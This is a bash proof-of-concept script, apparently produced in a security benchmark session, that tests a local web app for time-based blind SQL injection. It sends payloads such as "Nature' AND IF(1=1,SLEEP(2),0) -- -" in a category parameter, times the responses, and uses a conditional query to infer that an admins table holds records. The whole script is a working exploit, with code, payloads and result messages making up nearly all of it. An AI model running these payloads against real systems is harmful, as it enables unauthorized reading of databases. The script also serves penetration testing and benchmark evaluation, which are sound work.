#!/bin/bash
# POC: Time-based blind SQL injection using SLEEP() and IF() functions to infer database data through response time delays
# Target: ./repo
# Created: 2025-11-10T18:29:52.357Z
# Session: benchmark-XBEN-078-24-mhtgyxl3

# Time-Based Blind SQL Injection POC for Category Parameter (v2)
# Fixed URL encoding and timing measurement

TARGET_URL="http://localhost:32768"

echo "[*] Time-Based Blind SQL Injection POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Function to measure response time in milliseconds
measure_response_time() {
    local url="$1"
    local start=$(date +%s%3N)
    curl -s -o /dev/null -w "%{http_code}" "$url"
    local end=$(date +%s%3N)
    local duration=$((end - start))
    echo "$duration"
}

# Test 1: Baseline - normal request
echo "[*] Test 1: Baseline request (control)"
BASELINE_TIME=$(measure_response_time "${TARGET_URL}/?category=Nature")
echo "[+] Response Time: ${BASELINE_TIME}ms"
echo ""

# Test 2: Payload with TRUE condition and 2-second sleep
# Using curl -G to properly encode parameters
echo "[*] Test 2: TRUE condition with SLEEP(2)"
echo "[*] Payload: Nature' AND IF(1=1,SLEEP(2),0) -- -"

START=$(date +%s%N)
HTTP_CODE=$(curl -s -G \
    --data-urlencode "category=Nature' AND IF(1=1,SLEEP(2),0) -- -" \
    -o /dev/null \
    -w "%{http_code}" \
    "${TARGET_URL}/")
END=$(date +%s%N)

RESPONSE_TIME=$((($END - $START) / 1000000))
echo "[+] HTTP Status: $HTTP_CODE"
echo "[+] Response Time: ${RESPONSE_TIME}ms"

if [ $RESPONSE_TIME -ge 2000 ]; then
    echo "[+] ✓ SLEEP(2) executed (2000ms+ delay)"
    TEST2_PASS=1
else
    echo "[-] ✗ No significant delay"
    TEST2_PASS=0
fi
echo ""

# Test 3: Payload with FALSE condition (no sleep)
echo "[*] Test 3: FALSE condition with SLEEP(2)"
echo "[*] Payload: Nature' AND IF(1=0,SLEEP(2),0) -- -"

START=$(date +%s%N)
HTTP_CODE=$(curl -s -G \
    --data-urlencode "category=Nature' AND IF(1=0,SLEEP(2),0) -- -" \
    -o /dev/null \
    -w "%{http_code}" \
    "${TARGET_URL}/")
END=$(date +%s%N)

RESPONSE_TIME=$((($END - $START) / 1000000))
echo "[+] HTTP Status: $HTTP_CODE"
echo "[+] Response Time: ${RESPONSE_TIME}ms"

if [ $RESPONSE_TIME -lt 1500 ]; then
    echo "[+] ✓ No sleep triggered (< 1500ms)"
    TEST3_PASS=1
else
    echo "[-] ✗ Unexpected delay"
    TEST3_PASS=0
fi
echo ""

# Test 4: Demonstrate conditional inference
echo "[*] Test 4: Conditional data inference"
echo "[*] Payload: Nature' AND IF((SELECT COUNT(*) FROM admins)>0,SLEEP(2),0) -- -"

START=$(date +%s%N)
HTTP_CODE=$(curl -s -G \
    --data-urlencode "category=Nature' AND IF((SELECT COUNT(*) FROM admins)>0,SLEEP(2),0) -- -" \
    -o /dev/null \
    -w "%{http_code}" \
    "${TARGET_URL}/")
END=$(date +%s%N)

RESPONSE_TIME=$((($END - $START) / 1000000))
echo "[+] HTTP Status: $HTTP_CODE"
echo "[+] Response Time: ${RESPONSE_TIME}ms"

if [ $RESPONSE_TIME -ge 2000 ]; then
    echo "[+] ✓ INFERRED: admins table contains records"
    TEST4_PASS=1
else
    echo "[-] ✗ Could not infer data"
    TEST4_PASS=0
fi
echo ""

# Results
echo "========== VULNERABILITY ASSESSMENT =========="
if [ $TEST2_PASS -eq 1 ] && [ $TEST3_PASS -eq 1 ]; then
    echo "[✓] Time-Based Blind SQL Injection CONFIRMED"
    echo ""
    echo "Evidence:"
    echo "  • IF() function is executable"
    echo "  • SLEEP() function causes measurable delays"
    echo "  • Conditional logic allows data inference"
    echo ""
    echo "Impact:"
    echo "  • Alternative exploitation vector"
    echo "  • Bypasses UNION/error-based filtering"
    echo "  • Enables character-by-character data extraction"
    exit 0
else
    echo "[✗] Time-Based Blind SQL Injection NOT CONFIRMED"
    exit 1
fi